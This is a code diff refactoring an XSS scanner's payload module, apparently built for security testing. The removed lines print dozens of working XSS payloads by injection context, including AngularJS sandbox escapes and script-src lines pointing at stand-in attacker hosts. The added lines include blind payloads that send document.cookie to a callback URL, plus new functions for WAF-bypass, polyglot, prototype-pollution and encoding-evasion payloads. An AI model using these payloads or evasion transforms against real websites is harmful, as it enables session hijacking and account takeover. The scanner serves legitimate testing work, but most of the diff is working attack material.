@@ -33,10 +33,54 @@ from ..http.waf_detect import (
   EVASION_NULL_BYTE,
   EVASION_UNICODE,
 )
+from ._payloads.html_context import (
+  HTML_BODY,
+  ATTR_DOUBLE,
+  ATTR_SINGLE,
+  ATTR_UNQUOTED,
+  ATTR_NAME,
+  TAG_NAME,
+  TEXTAREA,
+  TITLE,
+  NOSCRIPT,
+  IFRAME_SRCDOC,
+  OBJECT_DATA,
+  COMMENT,
+  CSS,
+  CSS_VALUE,
+)
+from ._payloads.script_context import (
+  SCRIPT_STRING_D,
+  SCRIPT_STRING_S,
+  SCRIPT_BARE,
+  SCRIPT_TEMPLATE,
+  SCRIPT_REGEX,
+  SCRIPT_COMMENT,
+  EVENT_HANDLER,
+  URL_ATTR,
+  SCRIPT_SRC,
+)
+from ._payloads.advanced import (
+  ANGULAR_TEMPLATE,
+  ANGULAR_TEMPLATE_ALT,
+  ANGULAR_ATTR,
+  VUE_TEMPLATE,
+  JS_HOISTING,
+  DANGLING_MARKUP,
+  CSS_TRANSITION,
+  EXTRA_NO_INTERACTION,
+  FILE_UPLOAD,
+  RESTRICTED_CHARS,
+  POLYGLOT,
+  WAF_BYPASS_GLOBAL,
+  PROTOTYPE_POLLUTION,
+  CLASSIC_LEGACY,
+  ENCODING,
+  CONTENT_TYPE,
+)
 
 # ---------------------------------------------------------------------------
 # Confirmation marker — unique string embedded in every payload.
-# The scanner checks for this in the response to confirm execution.
 # ---------------------------------------------------------------------------
 CONFIRM_MARKER_PREFIX = "vXSS_EXEC_"
 
@@ -47,308 +91,39 @@ def make_confirm_marker() -> str:
 
 
 # ---------------------------------------------------------------------------
-# Base payloads per context
-# Each entry is a format string that accepts a `marker` kwarg.
+# Context → payload list map
 # ---------------------------------------------------------------------------
-
-_HTML_BODY_PAYLOADS = [
-  "<img src=x onerror=alert('{marker}')>",
-  "<svg onload=alert('{marker}')>",
-  "<details open ontoggle=alert('{marker}')>",
-  "<iframe srcdoc=\"<script>alert('{marker}')</script>\">",
-  "<body onload=alert('{marker}')>",
-  "<input autofocus onfocus=alert('{marker}')>",
-  "<video src=x onerror=alert('{marker}')>",
-  "<math><mtext></math><img src=x onerror=alert('{marker}')>",
-  "<table background=\"javascript:alert('{marker}')\">",
-  "</p><script>alert('{marker}')</script>",
-  "<noscript><p title=\"</noscript><img src=x onerror=alert('{marker}')\">",
-  "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('{marker}')\">",
-  "<div onmouseover=\"alert('{marker}')\">x</div>",
-  "<body><img src=x onerror=alert('{marker}')></body>",
-  "\n<img src=x onerror=alert('{marker}')>",
-  "\n<script>alert('{marker}')</script>",
-]
-
-_ATTR_DOUBLE_PAYLOADS = [
-  '"><img src=x onerror=alert(\'{marker}\')>',
-  '"><svg onload=alert(\'{marker}\')>',
-  '" onmouseover="alert(\'{marker}\')" x="',
-  '" onfocus="alert(\'{marker}\')" autofocus="',
-  '"><details open ontoggle=alert(\'{marker}\')>',
-  '"><script>alert(\'{marker}\')</script>',
-  '" style="expression(alert(\'{marker}\'))" x="',
-  '"><meta http-equiv="refresh" content="0;url=javascript:alert(\'{marker}\')">',
-]
-
-_ATTR_SINGLE_PAYLOADS = [
-  "'><img src=x onerror=alert('{marker}')>",
-  "' onmouseover='alert(\"{marker}\")' x='",
-  "'><svg onload=alert('{marker}')>",
-  "' onfocus='alert(\"{marker}\")' autofocus='",
-  "' style='expression(alert(\"{marker}\"))' x='",
-]
-
-_ATTR_UNQUOTED_PAYLOADS = [
-  " onmouseover=alert('{marker}') x=",
-  " onfocus=alert('{marker}') autofocus ",
-  "/><img src=x onerror=alert('{marker}')>",
-  " style=expression(alert('{marker}')) ",
-]
-
-_SCRIPT_STRING_D_PAYLOADS = [
-  '"-alert(\'{marker}\')-"',
-  '";alert(\'{marker}\');//',
-  '";\nalert(\'{marker}\');\n//',
-  '\\"-alert(\'{marker}\')-\\"',
-  '"+alert(\'{marker}\')+\\"',
-]
-
-_SCRIPT_STRING_S_PAYLOADS = [
-  "'-alert('{marker}')-'",
-  "';alert('{marker}');//",
-  "';\nalert('{marker}');\n//",
-  "\\'-alert('{marker}')-\\'",
-]
-
-_SCRIPT_BARE_PAYLOADS = [
-  ";alert('{marker}')//",
-  "\nalert('{marker}')\n",
-  "/**/;alert('{marker}')//",
-  "};alert('{marker}');//",
-  "]};alert('{marker}');//",
-]
-
-_SCRIPT_TEMPLATE_PAYLOADS = [
-  "`-alert('{marker}')-`",
-  "`;alert('{marker}')//`",
-  "${{alert('{marker}')}}",
-  "`${{alert('{marker}')}}",
-  "`;alert('{marker}')//",
-]
-
-_EVENT_HANDLER_PAYLOADS = [
-  "alert('{marker}')",
-  "confirm('{marker}')",
-  "(function(){{alert('{marker}')}})();",
-  "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",  # alert(1) as charcode
-  "[1].find(alert)",
-]
-
-_URL_ATTR_PAYLOADS = [
-  "javascript:alert('{marker}')",
-  "JaVaScRiPt:alert('{marker}')",
-  "javascript&#58;alert('{marker}')",
-  "javascript:void(alert('{marker}'))",
-  "data:text/html,<script>alert('{marker}')</script>",
-  "//attacker.example/xss.js?{marker}",
-]
-
-_CSS_PAYLOADS = [
-  "expression(alert('{marker}'))",
-  "</style><script>alert('{marker}')</script>",
-  "</style><img src=x onerror=alert('{marker}')>",
-]
-
-_COMMENT_PAYLOADS = [
-  "-->;<script>alert('{marker}')</script><!--",
-  "--><img src=x onerror=alert('{marker}')><!--",
-  "--><svg onload=alert('{marker}')><!--",
-]
-
-# ---------------------------------------------------------------------------
-# Script-src remote inclusion payloads.
-#
-# The parameter is reflected directly into <script src="MARKER">.  The
-# browser fetches whatever URL is in src and executes it as JavaScript.
-# Confirmation: we check that the injected URL string appears unmodified
-# in the response (i.e. we can control the src value).
-#
-# These payloads use a callback-style placeholder so the scanner can
-# substitute an attacker-controlled origin.  For detection/confirmation
-# purposes the marker is embedded in the URL path so we can verify it
-# was reflected unencoded.
-# ---------------------------------------------------------------------------
-_SCRIPT_SRC_PAYLOADS = [
-  # Attacker-controlled external host (generic)
-  "//attacker.example/{marker}.js",
-  # Protocol-relative pointing to a callback host
-  "//evil.example/xss/{marker}",
-  # Absolute http: URL (most permissive target)
-  "http://attacker.example/{marker}.js",
-  # Break out of src attribute then inject inline script
-  '"><script>alert("{marker}")</script>',
-  # Break out with single quote
-  "'><script>alert('{marker}')</script>",
-]
-
-# ---------------------------------------------------------------------------
-# AngularJS server-side template injection payloads.
-#
-# These payloads are Angular expressions that escape the sandbox and execute
-# arbitrary JavaScript.  They are placed *inside* the interpolation delimiters
-# (the scanner injects the full expression including the {{ }} or [[ ]] wrapper).
-#
-# Ordered by widest coverage: earliest entries work on older versions too.
-# ---------------------------------------------------------------------------
-_ANGULAR_TEMPLATE_PAYLOADS = [
-  # Works on Angular ≥1.1.5 – simplest constructor chain
-  "{{constructor.constructor('{marker}alert(1)')()}}",
-  # Works on Angular ≥1.1.5 – explicit window chain
-  "{{$on.constructor('alert(\\'{marker}\\')')()}}",
-  # Works on Angular 1.2.x (bypasses 1.2 sandbox)
-  "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1}} }} }};alert(\\'{marker}\\')//');}}",
-  # Works on Angular 1.3.x sandbox bypass
-  "{{{{}}[{{toString:[].join,length:1,0:'__proto__'}}].assign=[].join;'a'.constructor.prototype.charAt=[].join;"
-  " $eval('x=\\'{marker}\\',1}} }} }};alert(x)//');}}",
-  # Works on Angular 1.6+ (sandbox removed) — simplest form
-  "{{constructor.constructor('return alert')()('{marker}')}}" ,
-  # Alternative using $eval (all versions)
-  "{{$eval.constructor('alert(\\'{marker}\\')')()}}",
-]
-
-# Same payloads but wrapped with [[ ]] (alt interpolation symbols).
-# The scanner detects ANGULAR_TEMPLATE_ALT and uses these.
-_ANGULAR_TEMPLATE_ALT_PAYLOADS = [
-  p.replace("{{", "[[").replace("}}", "]]")
-  for p in _ANGULAR_TEMPLATE_PAYLOADS
-]
-
-# Payloads for injection directly into an ng-* attribute value.
-# The attribute value IS the Angular expression — no delimiters needed.
-_ANGULAR_ATTR_PAYLOADS = [
-  "constructor.constructor('{marker}alert(1)')()",
-  "$on.constructor('alert(\\'{marker}\\')')()",
-  "$eval.constructor('alert(\\'{marker}\\')')()",
-  "constructor.constructor('return alert')()('{marker}')",
-]
-
-# ---------------------------------------------------------------------------
-# New context payloads for /escape/ firing range cases
-# ---------------------------------------------------------------------------
-
-# TEXTAREA: reflection inside <textarea>MARKER</textarea>.
-# Must break out with </textarea>, then inject HTML.
-_TEXTAREA_PAYLOADS = [
-  "</textarea><img src=x onerror=alert('{marker}')>",
-  "</textarea><svg onload=alert('{marker}')>",
-  "</textarea><script>alert('{marker}')</script>",
-  "</textarea><details open ontoggle=alert('{marker}')>",
-]
-
-# TAG_NAME: reflection as a tag name, e.g. <MARKER>.
-# Inject a known dangerous/active tag.
-_TAG_NAME_PAYLOADS = [
-  "img src=x onerror=alert('{marker}')",
-  "svg onload=alert('{marker}')",
-  "script>alert('{marker}')</script",
-  "details open ontoggle=alert('{marker}')",
-  "input autofocus onfocus=alert('{marker}')",
-]
-
-# ATTR_NAME: reflection as an attribute name, e.g. <tag MARKER="">.
-# Inject an event-handler name.
-_ATTR_NAME_PAYLOADS = [
-  "onmouseover=alert('{marker}') x=",
-  "onfocus=alert('{marker}') autofocus ",
-  "onerror=alert('{marker}') src=x ",
-  "onload=alert('{marker}') ",
-]
-
-# CSS_VALUE: reflection inside a CSS property value, e.g. color: MARKER;
-# Break out of the block with }, then inject expression() or </style><script>.
-_CSS_VALUE_PAYLOADS = [
-  "}}</style><img src=x onerror=alert('{marker}')>",
-  "}}expression(alert('{marker}'))",
-  "}}</style><script>alert('{marker}')</script>",
-  "expression(alert('{marker}'))",   # IE legacy — may work without }
-  "}}</style><svg onload=alert('{marker}')>",
-]
-
-# SCRIPT_REGEX: reflection inside a JS regex literal, e.g. var r = /MARKER/;
-# Escape the regex, then inject JS.
-_SCRIPT_REGEX_PAYLOADS = [
-  "/;alert('{marker}')//",
-  "/;alert('{marker}');var x=/",
-  "/.test('');alert('{marker}');//",
-  "/g;alert('{marker}');//",
-]
-
-# SCRIPT_COMMENT: reflection inside a JS block comment, e.g. /* MARKER */
-# Escape with */, then inject JS.
-_SCRIPT_COMMENT_PAYLOADS = [
-  "*/;alert('{marker}');///*",
-  "*/alert('{marker}')/*",
-  "*/;alert('{marker}');var x=/*",
-  "*/ alert('{marker}') /*",
-]
-
-# TITLE: reflection inside <title>MARKER</title>.
-# Break out with </title>, then inject HTML.
-_TITLE_PAYLOADS = [
-  "</title><img src=x onerror=alert('{marker}')>",
-  "</title><svg onload=alert('{marker}')>",
-  "</title><script>alert('{marker}')</script>",
-  "</title><details open ontoggle=alert('{marker}')>",
-]
-
-# IFRAME_SRCDOC: reflection into <iframe srcdoc="MARKER">.
-# Full HTML injection; need to close the attribute first.
-_IFRAME_SRCDOC_PAYLOADS = [
-  '"><script>alert(\'{marker}\')</script>',
-  '"><img src=x onerror=alert(\'{marker}\')>',
-  '"><svg onload=alert(\'{marker}\')>',
-  # Payload already embedded in srcdoc attribute context — break out and inject
-  '<script>alert(\'{marker}\')</script>',
-  '<img src=x onerror=alert(\'{marker}\')>',
-]
-
-# NOSCRIPT: reflection inside <noscript>MARKER</noscript>.
-# Break out with </noscript>, then inject HTML.
-_NOSCRIPT_PAYLOADS = [
-  "</noscript><img src=x onerror=alert('{marker}')>",
-  "</noscript><svg onload=alert('{marker}')>",
-  "</noscript><script>alert('{marker}')</script>",
-  "</noscript><details open ontoggle=alert('{marker}')>",
-]
-
-# OBJECT_DATA: reflection inside <object data="MARKER"> or <param value="MARKER">.
-# Attacker supplies a URL the browser fetches as embedded content.
-_OBJECT_DATA_PAYLOADS = [
-  "javascript:alert('{marker}')",
-  "//attacker.example/{marker}",
-  "data:text/html,<script>alert('{marker}')</script>",
-  '"><script>alert(\'{marker}\')</script>',
-]
-
 _CONTEXT_MAP = {
-  ReflectionContext.HTML_BODY:            _HTML_BODY_PAYLOADS,
-  ReflectionContext.ATTR_DOUBLE:          _ATTR_DOUBLE_PAYLOADS,
-  ReflectionContext.ATTR_SINGLE:          _ATTR_SINGLE_PAYLOADS,
-  ReflectionContext.ATTR_UNQUOTED:        _ATTR_UNQUOTED_PAYLOADS,
-  ReflectionContext.ATTR_NAME:            _ATTR_NAME_PAYLOADS,
-  ReflectionContext.SCRIPT_STRING_D:      _SCRIPT_STRING_D_PAYLOADS,
-  ReflectionContext.SCRIPT_STRING_S:      _SCRIPT_STRING_S_PAYLOADS,
-  ReflectionContext.SCRIPT_BARE:          _SCRIPT_BARE_PAYLOADS,
-  ReflectionContext.SCRIPT_TEMPLATE:      _SCRIPT_TEMPLATE_PAYLOADS,
-  ReflectionContext.SCRIPT_REGEX:         _SCRIPT_REGEX_PAYLOADS,
-  ReflectionContext.SCRIPT_COMMENT:       _SCRIPT_COMMENT_PAYLOADS,
-  ReflectionContext.EVENT_HANDLER:        _EVENT_HANDLER_PAYLOADS,
-  ReflectionContext.URL_ATTR:             _URL_ATTR_PAYLOADS,
-  ReflectionContext.SCRIPT_SRC:           _SCRIPT_SRC_PAYLOADS,
-  ReflectionContext.CSS:                  _CSS_PAYLOADS,
-  ReflectionContext.CSS_VALUE:            _CSS_VALUE_PAYLOADS,
-  ReflectionContext.TEXTAREA:             _TEXTAREA_PAYLOADS,
-  ReflectionContext.TITLE:                _TITLE_PAYLOADS,
-  ReflectionContext.IFRAME_SRCDOC:        _IFRAME_SRCDOC_PAYLOADS,
-  ReflectionContext.NOSCRIPT:             _NOSCRIPT_PAYLOADS,
-  ReflectionContext.OBJECT_DATA:          _OBJECT_DATA_PAYLOADS,
-  ReflectionContext.TAG_NAME:             _TAG_NAME_PAYLOADS,
-  ReflectionContext.COMMENT:              _COMMENT_PAYLOADS,
-  ReflectionContext.ANGULAR_TEMPLATE:     _ANGULAR_TEMPLATE_PAYLOADS,
-  ReflectionContext.ANGULAR_TEMPLATE_ALT: _ANGULAR_TEMPLATE_ALT_PAYLOADS,
-  ReflectionContext.ANGULAR_ATTR:         _ANGULAR_ATTR_PAYLOADS,
-  ReflectionContext.UNKNOWN:              _HTML_BODY_PAYLOADS + _ATTR_DOUBLE_PAYLOADS,
+  ReflectionContext.HTML_BODY:            HTML_BODY,
+  ReflectionContext.ATTR_DOUBLE:          ATTR_DOUBLE,
+  ReflectionContext.ATTR_SINGLE:          ATTR_SINGLE,
+  ReflectionContext.ATTR_UNQUOTED:        ATTR_UNQUOTED,
+  ReflectionContext.ATTR_NAME:            ATTR_NAME,
+  ReflectionContext.SCRIPT_STRING_D:      SCRIPT_STRING_D,
+  ReflectionContext.SCRIPT_STRING_S:      SCRIPT_STRING_S,
+  ReflectionContext.SCRIPT_BARE:          SCRIPT_BARE,
+  ReflectionContext.SCRIPT_TEMPLATE:      SCRIPT_TEMPLATE,
+  ReflectionContext.SCRIPT_REGEX:         SCRIPT_REGEX,
+  ReflectionContext.SCRIPT_COMMENT:       SCRIPT_COMMENT,
+  ReflectionContext.EVENT_HANDLER:        EVENT_HANDLER,
+  ReflectionContext.URL_ATTR:             URL_ATTR,
+  ReflectionContext.SCRIPT_SRC:           SCRIPT_SRC,
+  ReflectionContext.CSS:                  CSS,
+  ReflectionContext.CSS_VALUE:            CSS_VALUE,
+  ReflectionContext.TEXTAREA:             TEXTAREA,
+  ReflectionContext.TITLE:                TITLE,
+  ReflectionContext.IFRAME_SRCDOC:        IFRAME_SRCDOC,
+  ReflectionContext.NOSCRIPT:             NOSCRIPT,
+  ReflectionContext.OBJECT_DATA:          OBJECT_DATA,
+  ReflectionContext.TAG_NAME:             TAG_NAME,
+  ReflectionContext.COMMENT:              COMMENT,
+  ReflectionContext.ANGULAR_TEMPLATE:     ANGULAR_TEMPLATE,
+  ReflectionContext.ANGULAR_TEMPLATE_ALT: ANGULAR_TEMPLATE_ALT,
+  ReflectionContext.ANGULAR_ATTR:         ANGULAR_ATTR,
+  ReflectionContext.VUE_TEMPLATE:         VUE_TEMPLATE,
+  ReflectionContext.JS_HOISTING:          JS_HOISTING,
+  ReflectionContext.DANGLING_MARKUP:      DANGLING_MARKUP,
+  ReflectionContext.UNKNOWN:              HTML_BODY + ATTR_DOUBLE,
 }
 
 
@@ -373,29 +148,24 @@ def generate(
   if marker is None:
     marker = make_confirm_marker()
 
-  base = _CONTEXT_MAP.get(context, _HTML_BODY_PAYLOADS)
+  base = _CONTEXT_MAP.get(context, HTML_BODY)
 
-  # Slice by level
   limits = {1: 3, 2: 6, 3: len(base)}
   base = base[: limits.get(level, 3)]
 
-  # Materialise markers
   payloads = [p.format(marker=marker) for p in base]
 
-  # Apply evasion transforms
   if evasion != EVASION_NONE:
     transformed = []
     for p in payloads:
-      variants = _apply_evasion(p, evasion)
-      transformed.extend(variants)
+      transformed.extend(_apply_evasion(p, evasion))
     payloads = transformed
 
-  # Append custom payloads
   if custom_payloads:
     payloads.extend(custom_payloads)
 
   # Deduplicate preserving order
-  seen = set()
+  seen: set = set()
   result = []
   for p in payloads:
     if p not in seen:
@@ -415,7 +185,81 @@ def blind_payloads(callback_url: str) -> List[str]:
     f"javascript:eval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39))+'{cb}/venom.js'+String.fromCharCode(39,59,100,111,99,117,109,101,110,116,46,104,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41))",
     f"</script><script>fetch('{cb}/?c='+document.cookie)</script>",
     f'<svg><animate onbegin=\'fetch("{cb}/?c="+document.cookie)\' attributeName=x dur=1s>',
+    f'<svg><animate onend=\'fetch("{cb}/?c="+document.cookie)\' attributeName=x dur=1s>',
+    f'<xss oncontentvisibilityautostatechange=\'fetch("{cb}/?c="+document.cookie)\' style=display:block;content-visibility:auto>',
+    f'<style>@keyframes x{{}}</style><xss style="animation-name:x" onanimationend=\'fetch("{cb}/?c="+document.cookie)\'></xss>',
+    f'<xss onfocus=\'fetch("{cb}/?c="+document.cookie)\' autofocus tabindex=1>',
   ]
+
+
+def file_upload_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return payloads for injection into uploaded SVG/HTML files."""
+  if marker is None:
+    marker = make_confirm_marker()
+  return [p.format(marker=marker) for p in FILE_UPLOAD]
+
+
+def restricted_char_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return payloads for environments that filter parens, angle brackets, etc."""
+  if marker is None:
+    marker = make_confirm_marker()
+  return [p.format(marker=marker) for p in RESTRICTED_CHARS]
+
+
+def polyglot_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return multi-context polyglot payloads."""
+  if marker is None:
+    marker = make_confirm_marker()
+  return [p.format(marker=marker) for p in POLYGLOT]
+
+
+def waf_bypass_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return WAF-bypass payloads using global object obfuscation."""
+  if marker is None:
+    marker = make_confirm_marker()
+  return [p.format(marker=marker) for p in WAF_BYPASS_GLOBAL]
+
+
+def prototype_pollution_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return prototype pollution gadget payloads."""
+  if marker is None:
+    marker = make_confirm_marker()
+  return [p.format(marker=marker) for p in PROTOTYPE_POLLUTION]
+
+
+def classic_legacy_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return classic/legacy XSS vectors (marquee, VBScript, etc.)."""
+  if marker is None:
+    marker = make_confirm_marker()
+  return [p.format(marker=marker) for p in CLASSIC_LEGACY]
+
+
+def encoding_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return encoding-based bypass payloads."""
+  if marker is None:
+    marker = make_confirm_marker()
+  return [p.format(marker=marker) for p in ENCODING]
+
+
+def content_type_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return payloads for SVG/XML/XSL/XHTML content-type responses."""
+  if marker is None:
+    marker = make_confirm_marker()
+  return [p.format(marker=marker) for p in CONTENT_TYPE]
+
+
+def css_transition_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return CSS transition/webkit animation event payloads."""
+  if marker is None:
+    marker = make_confirm_marker()
+  return [p.format(marker=marker) for p in CSS_TRANSITION]
+
+
+def extra_no_interaction_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return additional no-interaction event payloads."""
+  if marker is None:
+    marker = make_confirm_marker()
+  return [p.format(marker=marker) for p in EXTRA_NO_INTERACTION]
 
 
 # ---------------------------------------------------------------------------
@@ -469,10 +313,9 @@ def _html_encode_lt_gt(s: str) -> str:
 
 
 def _unicode_escape_alpha(s: str) -> str:
-  """Unicode-escape the alphabetic chars in tag names and event names."""
+  """Unicode-escape alphabetic chars in tag/event names."""
   def esc(m: re.Match) -> str:
     return "".join(f"\\u{ord(c):04x}" for c in m.group())
-  # Only escape inside JS strings / identifiers — crude but effective
   return re.sub(r"[a-zA-Z]{2,}", esc, s)
 
 
@@ -483,11 +326,8 @@ def _double_url_encode(s: str) -> str:
 
 
 def _chunked_tag(s: str) -> str:
-  """Split tag names with an SVG/HTML5 trick: <scr ipt> → won't parse but
-  some WAFs miss it. Also inserts /* */ inside event names."""
-  # Break script tag
+  """Split tag names and break event handler names with /**/."""
   s = re.sub(r"<(script)", r"<\1 ", s, flags=re.IGNORECASE)
-  # Break event handler names with /**/ comment
   s = re.sub(r"\b(on\w+)\b", lambda m: m.group()[:3] + "/**/" + m.group()[3:], s)
   return s
 
@@ -498,7 +338,7 @@ def _null_byte_inject(s: str) -> str:
 
 
 def _newline_inject(s: str) -> str:
-  """Replace spaces in tag/attribute names with %0a."""
+  """Replace spaces with %0a."""
   return s.replace(" ", "%0a")
 
 
@@ -514,9 +354,5 @@ def _backtick_attr(s: str) -> str:
 
 
 def _css_expression_break(s: str) -> str:
-  """
-  Break the literal word 'expression' with a CSS comment to bypass
-  keyword-based filters (e.g. ex/**/pression).  Works in IE and some
-  older WebKit/Blink engines that support CSS expression().
-  """
+  """Break 'expression' with a CSS comment to bypass keyword filters."""
   return re.sub(r"\bexpression\b", "ex/**/pression", s, flags=re.IGNORECASE)
